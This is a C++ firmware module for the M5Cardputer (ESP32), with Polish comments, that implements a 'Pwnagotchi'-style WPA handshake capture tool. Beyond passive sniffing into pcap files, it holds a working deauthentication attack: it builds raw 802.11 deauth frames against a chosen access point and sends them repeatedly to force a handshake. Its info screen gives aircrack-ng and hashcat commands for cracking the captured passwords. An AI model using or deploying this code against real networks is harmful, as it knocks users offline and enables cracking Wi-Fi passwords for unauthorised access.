#pragma once
// app_pwnagotchi.h — Pwnagotchi / WPA Handshake Capture
// Przeniesione z Bruce firmware (modules/pwnagotchi/)
//
// ESP32 w trybie monitor — sniffuje pakiety EAPOL handshake
// i zapisuje na karcie SD jako .pcap

#include "M5Cardputer.h"
#include "core/theme.h"
#include "core/ui.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <nvs_flash.h>
#include <esp_netif.h>

// ─── PCAP STRUCTURE ───────────────────────────────────
struct PcapHeader {
    uint32_t magic = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t  thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 105;  // 802.11
};

struct PcapPacketHdr {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};

static File _pcap_file;
static bool _pcap_open = false;
static int  _eapol_count = 0;
static int  _beacon_count = 0;
static int  _packet_count = 0;
static unsigned long _start_ms = 0;

// ─── HANDLER PAKIETÓW ─────────────────────────────────
static void IRAM_ATTR _wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_pcap_open) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;

    _packet_count++;

    // Wykryj typ ramki
    uint8_t frame_type = (payload[0] >> 2) & 0x03;
    uint8_t frame_subtype = (payload[0] >> 4) & 0x0F;

    if (frame_type == 0 && frame_subtype == 8) _beacon_count++;

    // Sprawdź EAPOL (handshake WPA)
    bool is_eapol = false;
    if (len > 32) {
        // LLC: 0xAA 0xAA 0x03 0x00 0x00 0x00 0x88 0x8E (EAPOL ethertype)
        for (int i = 24; i < min(len-8, 40); i++) {
            if (payload[i]==0xAA && payload[i+1]==0xAA && payload[i+2]==0x03 &&
                payload[i+6]==0x88 && payload[i+7]==0x8E) {
                is_eapol = true;
                _eapol_count++;
                break;
            }
        }
    }

    // Zapisz beacons + EAPOL do pcap
    if (frame_subtype == 8 || is_eapol) {
        PcapPacketHdr hdr;
        unsigned long ms = millis();
        hdr.ts_sec  = ms / 1000;
        hdr.ts_usec = (ms % 1000) * 1000;
        hdr.incl_len = len;
        hdr.orig_len = len;
        _pcap_file.write((uint8_t*)&hdr, sizeof(hdr));
        _pcap_file.write(payload, len);
    }
}

static bool _pwn_check_esc() {
    M5Cardputer.update();
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return false;
    auto s = M5Cardputer.Keyboard.keysState();
    if (s.fn) { for (char c : s.word) { if (c=='q'||c=='Q') return true; } }
    else { for (char c : s.word) { if (c==27) return true; } }
    return false;
}

// ─── HANDSHAKE CAPTURE ────────────────────────────────
void app_pwn_handshake() {
    SD.mkdir("/pwn");
    char fname[40];
    snprintf(fname, sizeof(fname), "/pwn/hs_%lu.pcap", millis()/1000);
    _pcap_file = SD.open(fname, FILE_WRITE);
    if (!_pcap_file) { ui_show_info("Blad SD!", THEME_RED); delay(2000); return; }

    PcapHeader ph;
    _pcap_file.write((uint8_t*)&ph, sizeof(ph));
    _pcap_open = true;
    _eapol_count = 0;
    _beacon_count = 0;
    _packet_count = 0;
    _start_ms = millis();

    // Włącz tryb monitor
    nvs_flash_init();
    esp_netif_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&_wifi_sniffer_cb);

    // Filtruj tylko management + data
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);

    int channel = 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    unsigned long lastHop = millis();

    bool redraw = true;
    while (!_pwn_check_esc()) {
        // Hop kanałów co 500ms (1-13)
        if (millis() - lastHop > 500) {
            lastHop = millis();
            channel = (channel % 13) + 1;
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            redraw = true;
        }

        if (redraw) {
            ui_draw_header("PWN - HANDSHAKE", THEME_RED);

            // ASCII art Pwnagotchi
            M5Cardputer.Display.setTextColor(THEME_GREEN, THEME_BG);
            M5Cardputer.Display.setTextSize(1);
            M5Cardputer.Display.setCursor(170, 22); M5Cardputer.Display.print("(.--.)");
            M5Cardputer.Display.setCursor(170, 32); M5Cardputer.Display.print("/o o \\");
            M5Cardputer.Display.setCursor(170, 42); M5Cardputer.Display.print(" >.<");

            M5Cardputer.Display.setTextColor(THEME_CYAN);
            M5Cardputer.Display.setCursor(4, 22);
            char buf[32]; snprintf(buf, sizeof(buf), "CH: %d", channel);
            M5Cardputer.Display.print(buf);

            M5Cardputer.Display.setTextColor(THEME_TEXT);
            M5Cardputer.Display.setCursor(4, 38);
            snprintf(buf, sizeof(buf), "Pakiety: %d", _packet_count);
            M5Cardputer.Display.fillRect(4, 38, 150, 12, THEME_BG);
            M5Cardputer.Display.print(buf);

            M5Cardputer.Display.setCursor(4, 52);
            snprintf(buf, sizeof(buf), "Beacons: %d", _beacon_count);
            M5Cardputer.Display.fillRect(4, 52, 150, 12, THEME_BG);
            M5Cardputer.Display.print(buf);

            // EAPOL — żółty/czerwony jeśli złapany
            M5Cardputer.Display.setTextColor(_eapol_count > 0 ? THEME_GREEN : THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 66);
            M5Cardputer.Display.fillRect(4, 66, 150, 12, THEME_BG);
            snprintf(buf, sizeof(buf), "EAPOL:   %d", _eapol_count);
            M5Cardputer.Display.print(buf);

            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 82);
            unsigned long s = (millis()-_start_ms)/1000;
            snprintf(buf, sizeof(buf), "Czas: %lum%02lus", s/60, s%60);
            M5Cardputer.Display.fillRect(4, 82, 150, 12, THEME_BG);
            M5Cardputer.Display.print(buf);

            M5Cardputer.Display.setCursor(4, 98);
            M5Cardputer.Display.print(fname);

            M5Cardputer.Display.setCursor(4, 125); M5Cardputer.Display.print("FN+Q = stop i zapisz");
            redraw = false;
        }
        delay(50);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    _pcap_open = false;
    _pcap_file.close();

    ui_draw_header("PWN - PODSUMOWANIE", THEME_GREEN);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4, 26);
    char buf[40];
    snprintf(buf, sizeof(buf), "Plik: %s", fname);
    M5Cardputer.Display.print(buf);
    M5Cardputer.Display.setCursor(4, 42); snprintf(buf, sizeof(buf), "Pakietow: %d", _packet_count);
    M5Cardputer.Display.print(buf);
    M5Cardputer.Display.setCursor(4, 56); snprintf(buf, sizeof(buf), "Beacons:  %d", _beacon_count);
    M5Cardputer.Display.print(buf);
    M5Cardputer.Display.setTextColor(_eapol_count>0 ? THEME_GREEN : THEME_RED);
    M5Cardputer.Display.setCursor(4, 70);
    snprintf(buf, sizeof(buf), "EAPOL:    %d %s", _eapol_count, _eapol_count>=4 ? "(HANDSHAKE!)" : "");
    M5Cardputer.Display.print(buf);
    M5Cardputer.Display.setTextColor(THEME_MUTED);
    M5Cardputer.Display.setCursor(4, 90);
    M5Cardputer.Display.print("Otworz plik w Wireshark");
    M5Cardputer.Display.setCursor(4, 102);
    M5Cardputer.Display.print("lub aircrack-ng");
    M5Cardputer.Display.setCursor(4, 125); M5Cardputer.Display.print("ENTER=powrot");
    while (true) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            auto s = M5Cardputer.Keyboard.keysState();
            for (char c : s.word) { if (c=='\n'||c=='\r'||c==27) return; }
        }
        if (M5Cardputer.BtnA.wasPressed()) return;
        delay(10);
    }
}

// ─── DEAUTH + HANDSHAKE COMBO ─────────────────────────
// Wysyła deauth żeby wymusić handshake i go nasłuchuje
void app_pwn_deauth_capture() {
    ui_draw_header("PWN - DEAUTH+CAPTURE", THEME_RED);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4, 26);
    M5Cardputer.Display.print("Skanuje sieci...");
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) { ui_show_info("Brak sieci!", THEME_RED); delay(2000); return; }

    // Lista sieci
    int sel = 0, offset = 0;
    bool redraw = true;
    while (true) {
        if (redraw) {
            ui_draw_header("WYBIERZ CEL", THEME_RED);
            for (int i = 0; i < 5 && (i+offset) < n; i++) {
                int idx = i + offset;
                bool a = (idx == sel);
                if (a) M5Cardputer.Display.fillRect(2, 22+i*19, 236, 18, THEME_RED>>2);
                M5Cardputer.Display.setTextColor(a ? THEME_RED : THEME_TEXT);
                M5Cardputer.Display.setCursor(6, 26+i*19);
                String s = WiFi.SSID(idx);
                if (s.length()>20) s = s.substring(0,19)+"~";
                M5Cardputer.Display.print(s);
                M5Cardputer.Display.setTextColor(THEME_MUTED);
                M5Cardputer.Display.setCursor(190, 26+i*19);
                M5Cardputer.Display.print(WiFi.RSSI(idx));
            }
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 125);
            M5Cardputer.Display.print("FN+;/. nav  ENTER=cel  ESC=wyjdz");
            redraw = false;
        }
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            auto s = M5Cardputer.Keyboard.keysState();
            if (s.fn) {
                if (_word_eq(s.word,";")) { if(sel>0){sel--;if(sel<offset)offset--;} redraw=true; }
                if (_word_eq(s.word,".")) { if(sel<n-1){sel++;if(sel>=offset+5)offset++;} redraw=true; }
            } else {
                for (char c : s.word) {
                    if (c=='\n'||c=='\r') goto target_selected;
                    if (c==27) { WiFi.scanDelete(); return; }
                }
            }
        }
        if (M5Cardputer.BtnA.wasPressed()) goto target_selected;
        delay(10);
    }
    target_selected:

    uint8_t* bssid = WiFi.BSSID(sel);
    int channel = WiFi.channel(sel);
    String ssid = WiFi.SSID(sel);
    WiFi.scanDelete();

    // Otwórz pcap
    SD.mkdir("/pwn");
    char fname[40];
    snprintf(fname, sizeof(fname), "/pwn/dh_%lu.pcap", millis()/1000);
    _pcap_file = SD.open(fname, FILE_WRITE);
    if (!_pcap_file) { ui_show_info("Blad SD!", THEME_RED); delay(2000); return; }
    PcapHeader ph;
    _pcap_file.write((uint8_t*)&ph, sizeof(ph));
    _pcap_open = true;
    _eapol_count = 0;
    _start_ms = millis();

    // Tryb monitor
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&_wifi_sniffer_cb);

    // Deauth frame
    uint8_t deauth[26] = {
        0xC0,0x00,0x3A,0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0xF0,0xFF,0x02,0x00
    };
    memcpy(deauth+10, bssid, 6);
    memcpy(deauth+16, bssid, 6);

    unsigned long lastDeauth = 0;
    bool redraw2 = true;
    while (!_pwn_check_esc()) {
        if (millis() - lastDeauth > 200) {
            lastDeauth = millis();
            esp_wifi_set_promiscuous(false);
            esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
            esp_wifi_set_promiscuous(true);
        }
        if (redraw2 || _eapol_count > 0) {
            ui_draw_header("PWN - DEAUTH+CAPTURE", THEME_RED);
            M5Cardputer.Display.setTextColor(THEME_RED);
            M5Cardputer.Display.setCursor(4, 24); M5Cardputer.Display.print("Cel: " + ssid);
            M5Cardputer.Display.setTextColor(THEME_TEXT);
            char buf[32];
            M5Cardputer.Display.setCursor(4, 40); snprintf(buf,sizeof(buf),"CH:%d  Pakiety:%d",channel,_packet_count); M5Cardputer.Display.print(buf);
            M5Cardputer.Display.setTextColor(_eapol_count>=4 ? THEME_GREEN : (_eapol_count>0 ? THEME_YELLOW : THEME_MUTED));
            M5Cardputer.Display.setCursor(4, 56); snprintf(buf,sizeof(buf),"EAPOL: %d/4 %s",_eapol_count,_eapol_count>=4?"OK!":""); M5Cardputer.Display.print(buf);
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 72); M5Cardputer.Display.print(fname);
            M5Cardputer.Display.setCursor(4, 125); M5Cardputer.Display.print("FN+Q = stop");
            redraw2 = false;
        }
        delay(100);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    _pcap_open = false;
    _pcap_file.close();
    WiFi.mode(WIFI_OFF);

    char msg[40]; snprintf(msg,sizeof(msg),"EAPOL: %d (handshake %s)", _eapol_count, _eapol_count>=4?"OK!":"NIEKOMP");
    ui_show_info(msg, _eapol_count>=4 ? THEME_GREEN : THEME_RED);
    delay(3000);
}

// ─── GŁÓWNE MENU ──────────────────────────────────────
void app_pwnagotchi_menu() {
    while (true) {
        const char* opts[] = {"Handshake (passive)","Deauth + Capture","Info"};
        int sel = ui_select_list(opts, 3, "PWNAGOTCHI", THEME_RED);
        if (sel < 0) return;
        if (sel == 0) app_pwn_handshake();
        if (sel == 1) app_pwn_deauth_capture();
        if (sel == 2) {
            ui_draw_header("PWN - INFO", THEME_RED);
            M5Cardputer.Display.setTextColor(THEME_TEXT);
            M5Cardputer.Display.setCursor(4,22); M5Cardputer.Display.print("Cardputer w trybie monitor");
            M5Cardputer.Display.setCursor(4,34); M5Cardputer.Display.print("zapisuje pakiety .pcap na SD");
            M5Cardputer.Display.setCursor(4,46); M5Cardputer.Display.print("(/pwn/*.pcap).");
            M5Cardputer.Display.setTextColor(THEME_GREEN);
            M5Cardputer.Display.setCursor(4,62); M5Cardputer.Display.print("Handshake = 4 ramki EAPOL");
            M5Cardputer.Display.setTextColor(THEME_TEXT);
            M5Cardputer.Display.setCursor(4,78); M5Cardputer.Display.print("Crackuj nastepnie:");
            M5Cardputer.Display.setTextColor(THEME_CYAN);
            M5Cardputer.Display.setCursor(4,90); M5Cardputer.Display.print("aircrack-ng -w slownik.txt");
            M5Cardputer.Display.setCursor(4,102); M5Cardputer.Display.print("hashcat -m 22000");
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4,125); M5Cardputer.Display.print("ENTER=powrot");
            while (true) {
                M5Cardputer.update();
                if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
                    auto s = M5Cardputer.Keyboard.keysState();
                    for (char c : s.word) { if (c=='\n'||c=='\r'||c==27) goto info_back; }
                }
                if (M5Cardputer.BtnA.wasPressed()) break;
                delay(10);
            }
            info_back:;
        }
    }
}
